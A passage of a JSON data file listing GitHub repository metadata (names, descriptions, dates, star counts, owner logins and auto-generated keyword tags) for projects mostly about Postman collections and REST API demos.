    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 58059246,
    "owner_login": "innodaria",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/58059246?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 251004081,
    "name": "postman_collection",
    "full_name": "SimonPostnikov/postman_collection",
    "description": null,
    "fork": false,
    "created_at": "2020-03-29T10:18:05Z",
    "updated_at": "2020-03-29T10:18:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 62829828,
    "owner_login": "SimonPostnikov",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/62829828?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 133516566,
    "name": "postman-collections",
    "full_name": "timway/postman-collections",
    "description": null,
    "fork": false,
    "created_at": "2018-05-15T12:59:52Z",
    "updated_at": "2018-05-16T20:01:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1091435,
    "owner_login": "timway",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1091435?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 130815405,
    "name": "Postman_Collection",
    "full_name": "plaban2017/Postman_Collection",
    "description": null,
    "fork": false,
    "created_at": "2018-04-24T07:38:29Z",
    "updated_at": "2018-04-24T07:38:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33566244,
    "owner_login": "plaban2017",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/33566244?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 238084932,
    "name": "ArubaCentral_Postman_Collection",
    "full_name": "jsnyder81/ArubaCentral_Postman_Collection",
    "description": "A collection of APIs from the Aruba Central Swagger json files",
    "fork": false,
    "created_at": "2020-02-03T23:39:57Z",
    "updated_at": "2020-02-04T03:45:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5827846,
    "owner_login": "jsnyder81",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/5827846?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "json",
      "files"
    ]
  },
  {
    "id": 143288232,
    "name": "PostMan-Collections-Sample",
    "full_name": "gothais/PostMan-Collections-Sample",
    "description": null,
    "fork": false,
    "created_at": "2018-08-02T11:54:42Z",
    "updated_at": "2018-08-06T02:57:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 362072,
    "owner_login": "gothais",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/362072?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 204554994,
    "name": "Maghub-Postman-Collection",
    "full_name": "magazinexperts/Maghub-Postman-Collection",
    "description": null,
    "fork": false,
    "created_at": "2019-08-26T20:22:30Z",
    "updated_at": "2019-08-27T02:57:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44814829,
    "owner_login": "magazinexperts",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/44814829?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 244288058,
    "name": "Timezone-postman-collection",
    "full_name": "EThioDeveloper/Timezone-postman-collection",
    "description": null,
    "fork": false,
    "created_at": "2020-03-02T05:28:51Z",
    "updated_at": "2020-03-02T06:09:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 53317814,
    "owner_login": "EThioDeveloper",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/53317814?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 192983205,
    "name": "munkireport-postman-collection",
    "full_name": "joncrain/munkireport-postman-collection",
    "description": "Postman config file for some generic MunkiReport API stuff",
    "fork": false,
    "created_at": "2019-06-20T20:25:53Z",
    "updated_at": "2019-06-21T17:10:02Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 5123982,
    "owner_login": "joncrain",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/5123982?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "config",
      "stuff",
      "generic"
    ]
  },
  {
    "id": 164799216,
    "name": "TestingPostmanCollection",
    "full_name": "shashwatdixit124/TestingPostmanCollection",
    "description": null,
    "fork": false,
    "created_at": "2019-01-09T06:06:16Z",
    "updated_at": "2019-01-09T06:10:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16637488,
    "owner_login": "shashwatdixit124",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/16637488?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 180644210,
    "name": "PostMan-Collection",
    "full_name": "WadesWeaponShed/PostMan-Collection",
    "description": null,
    "fork": false,
    "created_at": "2019-04-10T18:49:33Z",
    "updated_at": "2019-04-10T18:52:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 11415062,
    "owner_login": "WadesWeaponShed",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/11415062?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 194979428,
    "name": "Postman-Collection-One",
    "full_name": "wliando/Postman-Collection-One",
    "description": null,
    "fork": false,
    "created_at": "2019-07-03T04:27:17Z",
    "updated_at": "2019-07-03T04:27:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52386714,
    "owner_login": "wliando",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/52386714?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 193841929,
    "name": "vtc-postman-collections",
    "full_name": "jcrosswh/vtc-postman-collections",
    "description": null,
    "fork": false,
    "created_at": "2019-06-26T06:21:08Z",
    "updated_at": "2019-06-29T15:36:35Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2009511,
    "owner_login": "jcrosswh",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2009511?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 115119881,
    "name": "Postman-CSV-upload-Collection-Runner",
    "full_name": "Aadhavans/Postman-CSV-upload-Collection-Runner",
    "description": "I need to upload CSV file to execute attendance sheet Collection Runner  Suggest me with the steps ",
    "fork": false,
    "created_at": "2017-12-22T13:57:00Z",
    "updated_at": "2017-12-22T13:57:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34772512,
    "owner_login": "Aadhavans",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/34772512?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "load",
      "need",
      "upload",
      "execute",
      "steps",
      "attendance"
    ]
  },
  {
    "id": 142484443,
    "name": "qtm4j-postman-collection",
    "full_name": "qmetry/qtm4j-postman-collection",
    "description": null,
    "fork": false,
    "created_at": "2018-07-26T19:21:28Z",
    "updated_at": "2018-07-26T19:23:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 20469769,
    "owner_login": "qmetry",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20469769?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 98315920,
    "name": "PostmanImportWSDL",
    "full_name": "yurkiss/PostmanImportWSDL",
    "description": "Parse WSDL and generate Postman collection v2.0 JSON file.",
    "fork": false,
    "created_at": "2017-07-25T14:33:56Z",
    "updated_at": "2018-10-18T07:13:49Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 5471561,
    "owner_login": "yurkiss",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/5471561?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "generate"
    ]
  },
  {
    "id": 199181136,
    "name": "Postman",
    "full_name": "yuuvis/Postman",
    "description": "This is the yuuvis® Ultimate Postman collection incl. a sample metaData.json file",
    "fork": false,
    "created_at": "2019-07-27T15:19:31Z",
    "updated_at": "2020-03-03T06:29:47Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 49696437,
    "owner_login": "yuuvis",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/49696437?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "json",
      "sample"
    ]
  },
  {
    "id": 130590857,
    "name": "postman-to-http",
    "full_name": "vilimco/postman-to-http",
    "description": "Convert your Postman collection to PHPStorms' .http file collection. ",
    "fork": false,
    "created_at": "2018-04-22T17:29:59Z",
    "updated_at": "2018-05-21T14:58:55Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 8858431,
    "owner_login": "vilimco",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/8858431?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "http"
    ]
  },
  {
    "id": 230975400,
    "name": "postman-files",
    "full_name": "DavidUser/postman-files",
    "description": "Edit postman collections as simple system files",
    "fork": false,
    "created_at": "2019-12-30T20:25:58Z",
    "updated_at": "2019-12-31T01:27:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6628028,
    "owner_login": "DavidUser",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/6628028?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "collections",
      "postman collection",
      "file",
      "files",
      "postman collections",
      "system"
    ]
  },
  {
    "id": 90466934,
    "name": "ApiDocumentor",
    "full_name": "foobar1643/ApiDocumentor",
    "description": "A tool that allows you generate documentation to the API based on Postman collection files",
    "fork": false,
    "created_at": "2017-05-06T14:02:52Z",
    "updated_at": "2017-05-06T16:49:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16771771,
    "owner_login": "foobar1643",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/16771771?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "tool",
      "based",
      "document",
      "generate",
      "files",
      "documentation",
      "allows"
    ]
  },
  {
    "id": 226862809,
    "name": "RestApi_CRUD_Hibernate_MySQL_Showroom_XML_Response",
    "full_name": "FilipecbRibeiro/RestApi_CRUD_Hibernate_MySQL_Showroom_XML_Response",
    "description": "No view files, using only PostMan!",
    "fork": false,
    "created_at": "2019-12-09T12:11:24Z",
    "updated_at": "2019-12-09T12:24:45Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 56171998,
    "owner_login": "FilipecbRibeiro",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/56171998?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "view"
    ]
  },
  {
    "id": 228655022,
    "name": "Basic-Authentication-with-rest-postman-credentails-with-screenshots",
    "full_name": "MerumRaviTeja/Basic-Authentication-with-rest-postman-credentails-with-screenshots",
    "description": "example files",
    "fork": false,
    "created_at": "2019-12-17T16:17:08Z",
    "updated_at": "2019-12-17T16:41:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37837597,
    "owner_login": "MerumRaviTeja",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/37837597?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "example",
      "files"
    ]
  },
  {
    "id": 138725378,
    "name": "profile",
    "full_name": "BaneleMlamleli/profile",
    "description": "Spring Boot application that will use REST API to create, read, update and delete a user profile",
    "fork": false,
    "created_at": "2018-06-26T10:58:01Z",
    "updated_at": "2019-04-25T02:28:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29200010,
    "owner_login": "BaneleMlamleli",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/29200010?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "file",
      "application",
      "user",
      "read",
      "update",
      "delete",
      "profile"
    ]
  },
  {
    "id": 248030724,
    "name": "REST-Project2",
    "full_name": "rdw6297/REST-Project2",
    "description": "A RESTful service written in Java. A WAR file is used to run this service and I used Postman to test it.",
    "fork": false,
    "created_at": "2020-03-17T17:22:23Z",
    "updated_at": "2020-03-17T17:43:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 47403827,
    "owner_login": "rdw6297",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/47403827?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "service",
      "written"
    ]
  },
  {
    "id": 130214425,
    "name": "fschecker",
    "full_name": "hifly81/fschecker",
    "description": "Rest APIs for CRUD operations on text files",
    "fork": false,
    "created_at": "2018-04-19T12:46:24Z",
    "updated_at": "2018-04-19T12:47:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 640061,
    "owner_login": "hifly81",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/640061?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "operation",
      "operations",
      "text"
    ]
  },
  {
    "id": 159887137,
    "name": "task",
    "full_name": "krukarkonrad/task",
    "description": "[Internship Assignment]Simple REST API (unzipping may be surprisingly \"long\" because of \"root/node_modules\" folder amount of small files)",
    "fork": false,
    "created_at": "2018-11-30T22:51:07Z",
    "updated_at": "2019-01-13T20:16:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 27883693,
    "owner_login": "krukarkonrad",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/27883693?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "node",
      "sign",
      "files",
      "module",
      "long",
      "small",
      "folder",
      "modules",
      "cause"
    ]
  },
  {
    "id": 216312388,
    "name": "React_RestAPI",
    "full_name": "bobkrstic/React_RestAPI",
    "description": "CRUD with React.js and local JSON-Server. Adding books to the library with titles and ratings. Data is stored on a local json server and routes tested with Postman. Check README file for instructions on how to start the app. ",
    "fork": false,
    "created_at": "2019-10-20T05:29:50Z",
    "updated_at": "2019-10-31T03:15:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17989216,
    "owner_login": "bobkrstic",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/17989216?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "server",
      "json",
      "tested",
      "route",
      "local",
      "routes",
      "star",
      "library",
      "start",
      "rating",
      "struct",
      "store",
      "book",
      "books",
      "title",
      "instruction",
      "json server",
      "stored"
    ]
  },
  {
    "id": 157522865,
    "name": "springboot-rest-image-retriever",
    "full_name": "xrayin/springboot-rest-image-retriever",
    "description": "A spring boot application that uses REST to retrieve an image. Images are currently saved in the directory resources/images for convenience. Best practice would be to save it to a file system. Call any of the endpoints with a program of your choice, I used Postman. e.g. GET -> http://localhost:8080/images/abcd.png",
    "fork": false,
    "created_at": "2018-11-14T09:20:05Z",
    "updated_at": "2018-11-16T07:31:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 10046966,
    "owner_login": "xrayin",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10046966?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "application",
      "http",
      "endpoint",
      "points",
      "endpoints",
      "local",
      "source",
      "rent",
      "boot",
      "host",
      "spring",
      "image",
      "system",
      "program",
      "uses",
      "resource",
      "resources",
      "practice",
      "images",
      "spring boot",
      "retrieve",
      "current",
      "directory",
      "currently"
    ]
  },
  {
    "id": 26696395,
    "name": "ConnectFour",
    "full_name": "ekor15/ConnectFour",
    "description": "an attempt to create a level 2 rest api for component base connect four game add postman file for methods calls",
    "fork": false,
    "created_at": "2014-11-15T22:35:21Z",
    "updated_at": "2014-11-15T22:38:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5829500,
    "owner_login": "ekor15",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/5829500?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "file",
      "rest",
      "call",
      "calls",
      "connect",
      "method",
      "rest api",
      "methods",
      "game",
      "component",
      "attempt",
      "level"
    ]
  },
  {
    "id": 206587682,
    "name": "PHP-Restful-Api-OOP-",
    "full_name": "Hossam-PHP/PHP-Restful-Api-OOP-",
    "description": "Project Run steps 1- You have sql file import it . (hossamapi.sql) 2- Put project folder in xampp/htdocs or any local server you want . 3- Go to postman and run this api urls :- 1. READ BOOKS ( Read All ): (Get) http://localhost/api/book/read.php2. CREATE BOOK : (POST) http://localhost/api/book/create.php Data to insert : { \"name\" : \"Amazing keivy 20.0\", \"isbn\" : \"4-7555-66777\", \"author\" : \"The best pillow for amazing readers.\", \"category_id\" : 2, \"publish_date\" : \"2018-06-01 00:35:07\" }3. UPDATE BOOK : (Post) http://localhost/api/book/update.php Data to update : { \"id\" : \"66\", \"name\" : \"Amazing keivy 20.0\", \"isbn\" : \"4-7555-66777\", \"author\" : \"The best pillow for amazing readers.\", \"category_id\" : 2, \"publish_date\" : \"2018-06-01 00:35:07\" }4. DELETE BOOK : (Delete) http://localhost/api/book/delete.php Data to delete : { \"id\" : \"66\" } ############################## 5. READ ONE BOOK : (Get) http://localhost/api/book/read_one.php?id=60 ############################## 6. SEARCH BOOKS : (Get) http://localhost/api/book/search.php?s=Amazing ############################## 7. PAGINATE BOOKS : (Get) http://localhost/api/book/read_paging.php ############################## 8. READ CATEGORIES : (Get) http://localhost/api/category/read.php",
    "fork": false,
    "created_at": "2019-09-05T14:45:35Z",
    "updated_at": "2019-09-09T13:45:23Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 54269560,
    "owner_login": "Hossam-PHP",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/54269560?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "file",
      "server",
      "http",
      "auth",
      "local",
      "read",
      "import",
      "update",
      "host",
      "delete",
      "name",
      "search",
      "book",
      "docs",
      "folder",
      "best",
      "steps",
      "insert",
      "amazing",
      "urls"
    ]
  },
  {
    "id": 45817610,
    "name": "Messenger-App",
    "full_name": "venkatgunneri/Messenger-App",
    "description": "Messaging App, Creating Profiles, can share messages with sub resources as comments and likes. Code written in using REST API annotations and getting response in JSON. Postman API as a client. worked on resource URI's and collection URI's.  ",
    "fork": false,
    "created_at": "2015-11-09T05:43:56Z",
    "updated_at": "2015-11-09T05:43:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15709493,
    "owner_login": "venkatgunneri",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/15709493?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "client",
      "files",
      "source",
      "response",
      "written",
      "resource",
      "message",
      "resources",
      "getting",
      "messages",
      "comments",
      "worked",
      "notation"
    ]
  },
  {
    "id": 202314760,
    "name": "SpringBootJacksonProjectBinding",
    "full_name": "BlitZC4/SpringBootJacksonProjectBinding",
    "description": "A SpringBoot Demo app using Jackson project in the background to print out the Json files that are embedded in the project on the clients screen when it sneds GET request through a browser or a REST client like postman.",
    "fork": false,
    "created_at": "2019-08-14T09:06:08Z",
    "updated_at": "2019-08-14T09:06:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 49183125,
    "owner_login": "BlitZC4",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/49183125?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "request",
      "file",
      "client",
      "files",
      "browser",
      "print",
      "clients",
      "embedded",
      "background"
    ]
  },
  {
    "id": 227797005,
    "name": "task-managment",
    "full_name": "most-007/task-managment",
    "description": "Cakephp  app for task management and rest API to get all links in a given html document URL , and API to sent PDF file using postman to a given email ",
    "fork": false,
    "created_at": "2019-12-13T08:54:39Z",
    "updated_at": "2019-12-30T08:42:28Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 9547339,
    "owner_login": "most-007",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/9547339?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "rest",
      "document",
      "mail",
      "manage",
      "email",
      "html",
      "task",
      "management",
      "link",
      "given"
    ]
  },
  {
    "id": 194136086,
    "name": "API",
    "full_name": "VignaanVardhan/API",
    "description": "API to get the files and folders in a folder in a folder and get a file by ID,Ability to access this API via REST client like POSTMan ",
    "fork": false,
    "created_at": "2019-06-27T17:22:14Z",
    "updated_at": "2019-06-27T17:23:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38974958,
    "owner_login": "VignaanVardhan",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/38974958?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "client",
      "files",
      "access",
      "folder",
      "folders"
    ]
  },
  {
    "id": 115544571,
    "name": "todolist_using_api_and_ajax",
    "full_name": "danielxcom/todolist_using_api_and_ajax",
    "description": "Test-run of ajax syntax, todolist using RESTful web services tested with POSTMAN. Refactored REST operations in Promises + put them in helper file to make modular todos.js. Schema created using MongoDB",
    "fork": false,
    "created_at": "2017-12-27T17:48:23Z",
    "updated_at": "2017-12-27T17:51:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26654775,
    "owner_login": "danielxcom",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/26654775?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "file",
      "service",
      "tested",
      "help",
      "operation",
      "services",
      "list",
      "operations",
      "todo",
      "actor",
      "helper",
      "syntax",
      "ajax"
    ]
  },
  {
    "id": 119587689,
    "name": "SmackApplication",
    "full_name": "sonali-developer/SmackApplication",
    "description": "App Description: A clone of chat application namely Slack. It is a full fledged and professional looking ready to publish app on Appstore. It allows first time user to register by providing unique username, email and password along with selection of Avatar and Avatar's Background color; login using registered email and password, participate in channels available for chat, create new channel by adding users, perform live chat with other users of this app, can even logout, and so on.  • Built using Xcode 9, Swift 4, Cocoa pods, node.js, MongoDB, Heroku, Postman, etc. for iOS 11 based iPhones and iPads.  • Local Frameworks used includes Foundation, UIKit and other API's like Alamofire, SwiftyJSON, SocketIO, REST, SWReveal, etc.  • Demonstrated the use of Networking in iOS.  • Implemented Web Request creation in Xcode using UIKit, APIs, node.js and Mongo dB online. • Implemented Web service API hosting online using Heroku and local hosting using Postman. • Implemented user creation and real time talking using Socket Technology through SocketIO library.  • Implemented Web Service for User Registration, Authentication & Login, Channels Creation & display, fetching, sending and saving text messages and many more.  • Implemented Table Views, Collection Views & custom design of their cells using data models.  • Implemented side menu for the display of user profile and channels using SWReveal and Gradient color design code for providing gradient color background to this side menu.  • Implemented creation of two XIB's for Channels creation and profile view’s popUp.  • Implemented SegmentedControl for displaying 28 Dark and Light Avatar displays and code for generating Avatar’s background color on user registration screen.  • Implemented Input Accessory View for Text field.  • In all designed around eight View Controllers and their corresponding storyboard file for GUI design, Four Services, two custom cells, seven view files, two model files and lots of assets and so on. ",
    "fork": false,
    "created_at": "2018-01-30T20:02:55Z",
    "updated_at": "2018-06-24T20:51:57Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 20232921,
    "owner_login": "sonali-developer",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20232921?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "data",
      "form",
      "file",
      "application",
      "script",
      "service",
      "node",
      "user",
      "based",
      "code",
      "sign",
      "mail",
      "line",
      "files",
      "send",
      "local",
      "full",
      "read",
      "users",
      "more",
      "library",
      "view",
      "host",
      "email",
      "perform",
      "rating",
      "store",
      "play",
      "name",
      "working",
      "side",
      "allows",
      "long",
      "model",
      "custom",
      "message",
      "text",
      "design",
      "includes",
      "login",
      "along",
      "available",
      "clone",
      "designed",
      "fetch",
      "creation",
      "sending",
      "around",
      "ready",
      "many",
      "messages",
      "online",
      "sets",
      "display",
      "models",
      "register",
      "select",
      "generating",
      "fire",
      "playing",
      "profile",
      "adding",
      "talk",
      "hosting",
      "providing",
      "registration",
      "chat",
      "saving",
      "background",
      "namely",
      "fetching",
      "selection",
      "real time",
      "lots"
    ]
  },
  {
    "id": 215877357,
    "name": "busticketing",
    "full_name": "Mir00r/busticketing",
    "description": "Bus Reservation System_ and tried to implement an Admin portal which can be operated over browsers and a series of REST APIs to interact with the system using mobile applications or frontend applications written for the browsers. The complete systems has two important actors :  1. Admin user 2. End user  The _Admin user_ can access this application on browser (laptop or mobile/tablet, doesn't really matter as this is built using bootstrap, material design and is completely responsive) and can perform the following actions :  1. Signup 2. Login (Spring sessions) 3. Update their profile 4. Create an agency 5. Add buses to the agency 6. Add trips consisting of predefined stops and buses   The _End user_ can use their mobile application (yet to be built, however the REST APIs are ready and could be used via Postman or Swagger) to perform the following actions :  1. Signup 2. Login (and get a JWT token)  3. List all available stops 4. Search a trip between any two stops 5. Filter search results with a date option 6. Book a ticket for a given trip schedule  Admin interface and REST APIs both have their independent authentication mechanisms, the web application uses the cookie based authentication (provided by default by Spring security) and the REST API uses the JWT authentication for access. This application assumes the availability of 'MongoDB' installation on the localhost where the server will run or the use of docker-compose to boot up a mysqldb container and link the application with it within the realm of docker.  Any changes that the admin users will do on the web portal will impact the search results of the end users, there will be certain use cases which you may find missing here, I hope you will appreciate that the overall idea was to present a way to create such an application completely inside the realm of Spring Boot and not to actually building a fully functional reservation system.  The admin user interface is completely written in material design using Bootstrap v4 and is responsive to suite a variety of devices. The template engine used to render the admin views is Thymeleaf since the library is extremely extensible and its natural templating capability ensures templates can be prototyped without a back-end – which makes development very fast when compared with other popular template engines such as JSP.",
    "fork": false,
    "created_at": "2019-10-17T20:11:48Z",
    "updated_at": "2019-12-18T20:19:33Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 2,
    "watchers": 1,
    "score": 1,
    "owner_id": 11166444,
    "owner_login": "Mir00r",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/11166444?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "file",
      "application",
      "server",
      "user",
      "based",
      "develop",
      "implement",
      "contain",
      "sign",
      "auth",
      "build",
      "function",
      "local",
      "full",
      "read",
      "import",
      "interact",
      "built",
      "authentication",
      "front",
      "users",
      "library",
      "boot",
      "plate",
      "view",
      "host",
      "development",
      "face",
      "written",
      "very",
      "perform",
      "functional",
      "provide",
      "system",
      "access",
      "action",
      "side",
      "browser",
      "search",
      "web app",
      "mysql",
      "docker",
      "uses",
      "ever",
      "template",
      "case",
      "result",
      "interface",
      "token",
      "complete",
      "building",
      "design",
      "ully",
      "type",
      "fully",
      "install",
      "between",
      "link",
      "frontend",
      "available",
      "results",
      "applications",
      "within",
      "provided",
      "cases",
      "following",
      "mobile",
      "ready",
      "find",
      "given",
      "container",
      "popular",
      "actor",
      "suite",
      "define",
      "default",
      "templates",
      "both",
      "such",
      "engine",
      "sessions",
      "mechanism",
      "profile",
      "schedule",
      "consist",
      "render",
      "admin",
      "pact",
      "security",
      "makes",
      "systems",
      "important",
      "inside",
      "compose",
      "fully functional",
      "material",
      "series",
      "ticket",
      "responsive",
      "operate",
      "compare",
      "prototype",
      "completely",
      "idea",
      "consisting",
      "actually",
      "devices",
      "reservation",
      "predefined"
    ]
  },
  {
    "id": 117090760,
    "name": "python_postman",
    "full_name": "Waitfish/python_postman",
    "description": "Test for postman file.",
    "fork": false,
    "created_at": "2018-01-11T11:22:02Z",
    "updated_at": "2018-01-11T11:25:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7663932,
    "owner_login": "Waitfish",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/7663932?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file"
    ]
  },
  {
    "id": 205199684,
    "name": "Postman-Example",
    "full_name": "mmurphyhx/Postman-Example",
    "description": "Testing the version control of postman files",
    "fork": false,
    "created_at": "2019-08-29T15:57:49Z",
    "updated_at": "2020-01-27T15:57:11Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 49281505,
    "owner_login": "mmurphyhx",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/49281505?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "files",
      "version",
      "control"
    ]
  },
